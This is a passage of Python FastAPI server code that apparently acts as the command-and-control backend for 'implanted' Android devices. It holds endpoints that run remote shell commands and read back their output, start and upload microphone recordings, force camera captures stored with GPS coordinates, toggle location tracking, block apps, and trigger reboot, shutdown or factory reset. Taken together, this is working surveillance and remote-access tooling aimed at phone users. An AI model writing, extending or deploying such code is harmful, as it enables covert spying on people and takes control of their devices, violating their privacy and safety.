    # Set state to 2 (Pending/Queued) initially. It only becomes 1 (Active) when the device sends `alert_shown` IPC.
    final_state = 2 if state == 1 else 0
    db.cursor().execute("UPDATE devices SET notif_state=?, notif_text=? WHERE device_id=?", (final_state, text, device_id))
    db.commit()

    if not delivered:
        print(f"[alert] Device {device_id} offline; alert command queued in DB", flush=True)

    await sse.broadcast(
        "command_delivered" if delivered else "command_queued",
        {"device_id": device_id, "task": "system_alert", "state": state, "delivered": delivered},
    )
    return {"status": "success", "delivered": delivered}


@app.post("/set_audio")
async def set_audio(
    device_id: str = Form(...), play_audio: int = Form(...), loops: int = Form(0),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    if play_audio not in (0, 1, 2, 3):
        return JSONResponse({"status": "error", "message": f"Invalid play_audio: {play_audio}"}, status_code=400)

    c = db.cursor()
    # FIX C-3: do NOT reset audio_playing=0 on play commands — that must only
    # happen when the device confirms via POST /audio_done. Resetting prematurely
    # causes the UI badge to show wrong state and can trigger double-blast on reconnect.
    if play_audio == 0:
        # Stop command: clear all audio state immediately
        c.execute(
            "UPDATE devices SET play_audio=0, audio_loops=0, audio_playing=0 WHERE device_id=?",
            (device_id,),
        )
    else:
        # Play command: only update the desired type and loops, leave audio_playing alone
        c.execute(
            "UPDATE devices SET play_audio=?, audio_loops=? WHERE device_id=?",
            (play_audio, loops, device_id),
        )
    db.commit()

    payload   = {"task": "audio_blast", "play": str(play_audio), "loops": str(loops)}
    delivered = await ws_manager.send_task(device_id, payload)

    if not delivered:
        print(f"[audio] Device {device_id} offline; command queued in DB", flush=True)
        if play_audio == 0:
            c.execute("UPDATE devices SET play_audio=0, audio_loops=0, audio_playing=0 WHERE device_id=?", (device_id,))
            db.commit()

    # Notify browser immediately whether the command reached the device or was queued.
    await sse.broadcast(
        "command_delivered" if delivered else "command_queued",
        {"device_id": device_id, "task": "audio_blast", "play": play_audio, "delivered": delivered},
    )
    return {"status": "success", "delivered": delivered}


@app.post("/audio_started")
async def audio_started(
    device_id: str = Form(...), implant_key: str = Form(...), play_audio: int = Form(1),
    db: sqlite3.Connection = Depends(get_db),
):
    """Deprecated: Java apps now report audio lifecycle via reporter's LocalSocket IPC.
    This endpoint is kept for backward compatibility with older APK versions only."""
    print(f"[deprecated] /audio_started called directly by {device_id} — update APK", flush=True)
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)
    if not validate_device_id(device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    if play_audio not in (1, 2, 3):
        play_audio = 0
    db.cursor().execute("UPDATE devices SET audio_playing=1, play_audio=? WHERE device_id=?", (play_audio, device_id))
    db.commit()
    print(f"[audio] Device {device_id} started playback type={play_audio}", flush=True)
    await sse.broadcast("audio_started", {"device_id": device_id, "play_audio": play_audio})
    return {"status": "success"}


@app.post("/audio_done")
async def audio_done(
    device_id: str = Form(...), implant_key: str = Form(...),
    db: sqlite3.Connection = Depends(get_db),
):
    """Deprecated: use reporter IPC. Kept for backward compat."""
    print(f"[deprecated] /audio_done called directly by {device_id}", flush=True)
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)
    if not validate_device_id(device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    db.cursor().execute("UPDATE devices SET play_audio=0, audio_loops=0, audio_playing=0 WHERE device_id=?", (device_id,))
    db.commit()
    print(f"[audio] Device {device_id} finished playback; reset play_audio to 0", flush=True)
    await sse.broadcast("audio_done", {"device_id": device_id})
    return {"status": "success"}


# FIX R3-4: dedicated mic-record lifecycle endpoints so the server tracks when
# microphone capture begins and ends (parallel to /audio_started + /audio_done).
@app.post("/mic_record_started")
async def mic_record_started(
    device_id: str = Form(...), implant_key: str = Form(...),
    db: sqlite3.Connection = Depends(get_db),
):
    """Deprecated: use reporter IPC. Kept for backward compat."""
    print(f"[deprecated] /mic_record_started called directly by {device_id}", flush=True)
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)
    if not validate_device_id(device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    db.cursor().execute("UPDATE devices SET record_audio=1 WHERE device_id=?", (device_id,))
    db.commit()
    print(f"[mic] Device {device_id} started recording", flush=True)
    await sse.broadcast("mic_record_started", {"device_id": device_id})
    return {"status": "success"}


@app.post("/mic_record_done")
async def mic_record_done(
    device_id: str = Form(...), implant_key: str = Form(...),
    db: sqlite3.Connection = Depends(get_db),
):
    """Deprecated: use reporter IPC. Kept for backward compat."""
    print(f"[deprecated] /mic_record_done called directly by {device_id}", flush=True)
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)
    if not validate_device_id(device_id):
        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
    db.cursor().execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (device_id,))
    db.commit()
    print(f"[mic] Device {device_id} finished recording; reset record_audio to 0", flush=True)
    await sse.broadcast("mic_record_done", {"device_id": device_id})
    return {"status": "success"}


@app.post("/set_record_audio")
async def set_record_audio(
    device_id: str = Form(...), record_audio: int = Form(...), record_duration: int = Form(19),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    record_duration = max(1, min(record_duration, 300))
    c = db.cursor()
    c.execute("UPDATE devices SET record_audio=?, record_duration=? WHERE device_id=?",
              (record_audio, record_duration, device_id))
    db.commit()
    delivered = False
    if record_audio == 1:
        delivered = await ws_manager.send_task(device_id, {"task": "mic_record", "duration": record_duration})
    elif record_audio == 0:
        c.execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (device_id,))
        db.commit()
    return {"status": "success", "delivered": delivered}


@app.post("/set_power_cmd")
async def set_power_cmd(
    device_id: str = Form(...), action: str = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    c = db.cursor()
    if action == "reboot":
        c.execute("UPDATE devices SET reboot_cmd=1 WHERE device_id=?", (device_id,))
    elif action == "shutdown":
        c.execute("UPDATE devices SET shutdown_cmd=1 WHERE device_id=?", (device_id,))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "power_cmd", "action": action})
    return {"status": "success"}


@app.post("/run_shell_command")
async def run_shell_command(
    device_id: str = Form(...), command: str = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    db.cursor().execute(
        "UPDATE devices SET last_shell_command=?, last_shell_output=?,"
        " last_shell_status=0, last_shell_at=? WHERE device_id=?",
        (command, "[pending result]", time.time(), device_id),
    )
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "shell", "command": command})
        return {"status": "sent"}
    return JSONResponse({"status": "offline", "message": "Device not connected"}, status_code=404)


@app.get("/shell_output")
async def shell_output(request: Request, device_id: str, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute(
        "SELECT last_shell_command, last_shell_output, last_shell_status, last_shell_at"
        " FROM devices WHERE device_id = ?",
        (device_id,),
    )
    row = c.fetchone()
    if not row:
        return JSONResponse({"status": "unknown", "device_id": device_id}, status_code=404)
    return {
        "status": "ok", "device_id": device_id,
        "command":          row["last_shell_command"]  or "",
        "output":           row["last_shell_output"]   or "",
        "last_shell_status": row["last_shell_status"],
        "last_shell_at":    row["last_shell_at"]       or 0,
    }


@app.post("/set_factory_reset")
async def set_factory_reset(
    device_id: str = Form(...),
    request: Request = Depends(verify_session),
):
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "factory_reset"})
    return {"status": "success"}


@app.post("/check_location_state")
async def check_location_state(request: Request, device_id: str = Form(...)):
    verify_session(request)
    if device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "sent", "connected": False, "loc_state": None})

    future = asyncio.get_event_loop().create_future()
    pending_location_checks[device_id] = future
    try:
        await ws_manager.send_task(device_id, {"task": "check_location_state"})
        loc_state = await asyncio.wait_for(future, timeout=4.0)
        return JSONResponse({"status": "ok", "connected": True, "loc_state": int(loc_state)})
    except asyncio.TimeoutError:
        return JSONResponse({"status": "timeout", "connected": True, "loc_state": None})
    finally:
        pending_location_checks.pop(device_id, None)


@app.post("/request_installed_apps")
async def request_installed_apps(request: Request, device_id: str = Form(...)):
    verify_session(request)
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "refresh_installed_apps"})
    return JSONResponse({"status": "sent"})


@app.post("/set_location_tracking")
async def set_location_tracking(
    request: Request, device_id: str = Form(...), enable: int = Form(...),
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    db.cursor().execute("UPDATE devices SET location_tracking=? WHERE device_id=?", (enable, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "set_location", "track": enable})
    return JSONResponse({"status": "success"})


@app.post("/set_blocked_apps")
async def set_blocked_apps(
    request: Request, payload: dict = Body(...),
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    device_id = payload.get("device_id")
    if not device_id:
        return JSONResponse({"status": "error", "detail": "device_id is required"}, status_code=422)
    apps = payload.get("apps", "")
    apps = ",".join(str(a).strip() for a in apps if a) if isinstance(apps, list) else str(apps or "").strip()
    c = db.cursor()
    c.execute("SELECT device_id FROM devices WHERE device_id=?", (device_id,))
    if c.fetchone():
        c.execute("UPDATE devices SET blocked_apps=? WHERE device_id=?", (apps, device_id))
    else:
        c.execute("INSERT INTO devices (device_id, blocked_apps) VALUES (?,?)", (device_id, apps))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "update_blocked_apps", "apps": apps})
    return JSONResponse({"status": "success"})


@app.post("/delete_device")
async def delete_device(
    device_id: str = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    c = db.cursor()
    for table in ("history", "battery_history", "device_errors", "daily_screen_time"):
        c.execute(f"DELETE FROM {table} WHERE device_id = ?", (device_id,))
    db.commit()
    # FIX L-1: also purge selfie_schedule and selfie_skips so re-registered devices
    # don't inherit stale scheduling state from a previous registration.
    for table in ("devices", "selfies", "selfie_schedule", "selfie_skips"):
        c.execute(f"DELETE FROM {table} WHERE device_id = ?", (device_id,))
    db.commit()

    safe_id = sanitize_device_id(device_id)
    for directory in (AUDIO_DIR, SELFIE_DIR):
        if os.path.exists(directory):
            for fname in os.listdir(directory):
                if fname.startswith(f"{safe_id}_"):
                    with suppress(OSError):
                        os.remove(os.path.join(directory, fname))

    if device_id in ws_manager.active_connections:
        with suppress(Exception):
            await ws_manager.active_connections[device_id].close()
        await ws_manager.disconnect(device_id)

    return {"status": "success"}


@app.post("/stop_server")
async def stop_server(request: Request):
    verify_session(request)
    threading.Thread(target=lambda: (time.sleep(0.5), os._exit(0)), daemon=True).start()
    return JSONResponse({"status": "success", "message": "Server shutdown initiated."})


# ══════════════════════════════════════════════════════════════════════════════
# Audio file management
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/upload_audio")
async def upload_audio(
    implant_key: str = Form(...), device_id: str = Form(...),
    file: Optional[UploadFile] = File(None), error: Optional[str] = Form(None),
    db: sqlite3.Connection = Depends(get_db),
):
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)

    safe_id = sanitize_device_id(device_id)
    c       = db.cursor()

    # FIX L-3: enforce 50 MB size cap to prevent storage exhaustion
    MAX_AUDIO_BYTES = 50 * 1024 * 1024

    if error == "busy":
        fname = os.path.join(AUDIO_DIR, f"{safe_id}_{int(time.time())}_BUSY.txt")
        with open(fname, "w") as f:
            f.write("Microphone was busy by another app — 0.0s recorded")
        c.execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (device_id,))
    elif file:
        chunk = await file.read(MAX_AUDIO_BYTES + 1)
        if len(chunk) > MAX_AUDIO_BYTES:
            return JSONResponse({"status": "error", "message": "File too large (>50 MB)"}, status_code=413)
        fname = os.path.join(AUDIO_DIR, f"{safe_id}_{int(time.time())}.wav")
        with open(fname, "wb") as buf:
            buf.write(chunk)
        c.execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (device_id,))

    db.commit()
    return {"status": "success"}


@app.get("/audio_files")
async def get_audio_files(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    safe_id = sanitize_device_id(device_id)
    files   = []
    if os.path.exists(AUDIO_DIR):
        for fname in sorted(os.listdir(AUDIO_DIR), reverse=True):
            if not (fname.startswith(f"{safe_id}_") and
                    (fname.endswith(".wav") or fname.endswith(".m4a") or fname.endswith("BUSY.txt"))):
                continue
            path = os.path.join(AUDIO_DIR, fname)
            try:
                stat = os.stat(path)
            except OSError:
                continue
            name_only, _ = os.path.splitext(fname)
            flagged       = name_only.lower().endswith("_flag")
            if flagged:
                name_only = name_only[:-5]
            display_time = None
            for part in reversed(name_only.split("_")):
                if part.isdigit():
                    display_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(part)))
                    break
            files.append({
                "url": f"/media/audio/{fname}", "name": fname,
                "flagged": flagged, "timestamp": display_time, "size": stat.st_size,
            })
    return {"files": files}


@app.post("/delete_audio")
async def delete_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    path = os.path.join(AUDIO_DIR, os.path.basename(filename))
    if os.path.exists(path):
        os.remove(path)
    return {"status": "success"}


@app.post("/flag_audio")
async def flag_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    safe_name = os.path.basename(filename)
    path      = os.path.join(AUDIO_DIR, safe_name)
    if not os.path.exists(path):
        return {"status": "error", "message": "File not found"}
    base, ext = os.path.splitext(safe_name)
    new_name  = (base[:-5] if base.endswith("_FLAG") else base + "_FLAG") + ext
    try:
        os.rename(path, os.path.join(AUDIO_DIR, new_name))
    except OSError:
        return {"status": "error", "message": "Unable to toggle flag"}
    return {"status": "success"}


# ══════════════════════════════════════════════════════════════════════════════
# Selfie endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/api/upload-selfie")
async def upload_selfie(
    request: Request,
    selfie: UploadFile = File(...),
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db),
):
    device_id = request.headers.get("X-Device-ID", "unknown")
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized Payload")

    safe_id  = sanitize_device_id(device_id)
    now_unix = time.time()
    time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now_unix))
    date_str = time.strftime("%Y%m%d_%H%M%S",     time.localtime(now_unix))

    file_bytes = await selfie.read()
    if len(file_bytes) > 10 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="File too large")

    # Validate magic bytes (JPEG / PNG / GIF) to prevent XSS via false images
    header   = file_bytes[:4]
    is_image = (
        header.startswith(b"\xff\xd8\xff")  # JPEG
        or header.startswith(b"\x89PNG")    # PNG
        or header.startswith(b"GIF8")       # GIF
    )
    if not is_image:
        raise HTTPException(status_code=400, detail="Invalid image format")

    filename = f"{safe_id}_{date_str}.jpg"
    with open(os.path.join(SELFIE_DIR, filename), "wb") as f:
        f.write(file_bytes)

    c = db.cursor()
    c.execute("SELECT level, lat, lon FROM devices WHERE device_id = ?", (device_id,))
    row     = c.fetchone()
    battery = row["level"] if row else 0
    lat     = row["lat"]   if row else 0.0
    lon     = row["lon"]   if row else 0.0

    c.execute(
        "INSERT INTO selfies (device_id, filename, timestamp, unix_time, battery, lat, lon, review_status)"
        " VALUES (?,?,?,?,?,?,?,'pending')",
        (device_id, filename, time_str, now_unix, battery, lat, lon),
    )
    db.commit()
    selfie_id = c.lastrowid
    return {"status": "success", "filename": filename, "selfie_id": selfie_id}


@app.get("/api/selfie-status/{selfie_id}")
async def selfie_approval_status(
    selfie_id: int, request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db),
):
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    c = db.cursor()
    c.execute("SELECT review_status FROM selfies WHERE id = ?", (selfie_id,))
    row = c.fetchone()
    if not row:
        raise HTTPException(status_code=404, detail="Selfie not found")
    return {"selfie_id": selfie_id, "review_status": row["review_status"]}


@app.get("/api/device-selfies")
async def device_selfie_history(
    request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db),
):
    device_id = request.headers.get("X-Device-ID", "unknown")
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    c = db.cursor()
    c.execute(
        "SELECT id, filename, timestamp, review_status FROM selfies"
        " WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50",
        (device_id,),
    )
    return [
        {"id": r["id"], "filename": r["filename"],
         "timestamp": r["timestamp"], "status": r["review_status"]}
        for r in c.fetchall()
    ]


@app.get("/api/selfie-image/{filename}")
async def selfie_image_by_key(
    filename: str, request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
):
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    safe_name = os.path.basename(filename)
    file_path = os.path.join(SELFIE_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")


@app.post("/force_selfie")
async def force_selfie(device_id: str = Form(...), request: Request = Depends(verify_session)):
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "force_selfie"})
        return {"status": "success"}
    return {"status": "offline", "detail": "Device not connected"}


@app.get("/selfie_schedule")
async def selfie_schedule(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    row = ensure_selfie_schedule(device_id, db)
    return {"device_id": device_id, "next_run_at": row["next_run_at"],
            "enabled": row["enabled"], "dev_mode": row["dev_mode"]}


@app.post("/set_selfie_schedule")
async def set_selfie_schedule(
    device_id: str = Form(...), scheduled_time: str = Form(...),
    enabled: int = Form(1), dev_mode: int = Form(1),
    auth: bool = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    ensure_selfie_schedule(device_id, db)
    next_run_at = get_next_run_at_for_time_string(scheduled_time)
    c = db.cursor()
    c.execute(
        "UPDATE selfie_schedule SET next_run_at=?, enabled=?, dev_mode=?, updated_at=? WHERE device_id=?",
        (next_run_at, to_int(enabled, 1), to_int(dev_mode, 1), time.time(), device_id),
    )
    db.commit()
    return {"status": "success", "next_run_at": next_run_at,
            "enabled": to_int(enabled, 1), "dev_mode": to_int(dev_mode, 1)}


@app.post("/review_selfie")
async def review_selfie(
    selfie_id: int = Form(...), action: str = Form(...),
    auth: bool = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    review_status = "approved" if action == "approve" else "denied"
    reviewed_at   = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    db.cursor().execute(
        "UPDATE selfies SET review_status=?, reviewed_at=? WHERE id=?",
        (review_status, reviewed_at, selfie_id),
    )
    db.commit()
    return {"status": "success", "review_status": review_status, "reviewed_at": reviewed_at}


@app.get("/selfie_list")
async def selfie_list(
    device_id: str, request: Request,
    date: Optional[str] = None,
    db: sqlite3.Connection = Depends(get_db),
):
    verify_session(request)
    c = db.cursor()
    if date:
        c.execute(
            "SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at"
            " FROM selfies WHERE device_id = ? AND timestamp LIKE ? ORDER BY unix_time DESC",
            (device_id, f"{date}%"),
        )
    else:
        c.execute(
            "SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at"
            " FROM selfies WHERE device_id = ? ORDER BY unix_time DESC LIMIT 100",
            (device_id,),
        )
    return {
        "selfies": [
            {"id": r["id"], "filename": r["filename"],
             "url": f"/media/selfies/{r['filename']}",
             "timestamp": r["timestamp"], "battery": r["battery"],
             "lat": r["lat"], "lon": r["lon"],
             "review_status": r["review_status"], "reviewed_at": r["reviewed_at"]}
            for r in c.fetchall()
        ]
    }


@app.get("/selfie_dates")
async def selfie_dates(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute(
        "SELECT DISTINCT substr(timestamp,1,10) as date, COUNT(*) as count"
        " FROM selfies WHERE device_id = ? GROUP BY date ORDER BY date DESC",
        (device_id,),
    )
    return {"dates": [{"date": r["date"], "count": r["count"]} for r in c.fetchall()]}


@app.post("/skip_selfie_today")
async def skip_selfie_today(
    device_id: str = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    today     = time.strftime("%Y-%m-%d",    time.localtime())
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    c         = db.cursor()
    c.execute(
        "INSERT OR IGNORE INTO selfie_skips (device_id, skip_date, timestamp, unix_time) VALUES (?,?,?,?)",
        (device_id, today, timestamp, time.time()),
    )
    ensure_selfie_schedule(device_id, db)
    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if row and row["next_run_at"]:
        next_run = parse_datetime_string(row["next_run_at"])
        if next_run and next_run.date() == datetime.now().date():
            next_run += timedelta(days=1)
            c.execute(
                "UPDATE selfie_schedule SET next_run_at=?, updated_at=? WHERE device_id=?",
                (format_datetime_string(next_run), time.time(), device_id),
            )
    db.commit()
    return {"status": "ok", "skipped_today": True, "date": today}


@app.post("/unskip_selfie_today")
async def unskip_selfie_today(
    device_id: str = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    today = time.strftime("%Y-%m-%d", time.localtime())
    db.cursor().execute("DELETE FROM selfie_skips WHERE device_id=? AND skip_date=?", (device_id, today))
    db.commit()
    return {"status": "ok", "skipped_today": False, "date": today}


@app.get("/selfie_skip_status")
async def selfie_skip_status(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    today = time.strftime("%Y-%m-%d", time.localtime())
    c     = db.cursor()
    c.execute("SELECT 1 FROM selfie_skips WHERE device_id=? AND skip_date=? LIMIT 1", (device_id, today))
    return {"skipped_today": c.fetchone() is not None, "date": today}


@app.post("/delete_selfie")
async def delete_selfie(
    selfie_id: int = Form(...),
    request: Request = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db),
):
    c = db.cursor()
    c.execute("SELECT filename FROM selfies WHERE id = ?", (selfie_id,))
    row = c.fetchone()
    if row:
        path = os.path.join(SELFIE_DIR, os.path.basename(row["filename"]))
        if os.path.exists(path):
            os.remove(path)
        c.execute("DELETE FROM selfies WHERE id = ?", (selfie_id,))
        db.commit()
    return {"status": "success"}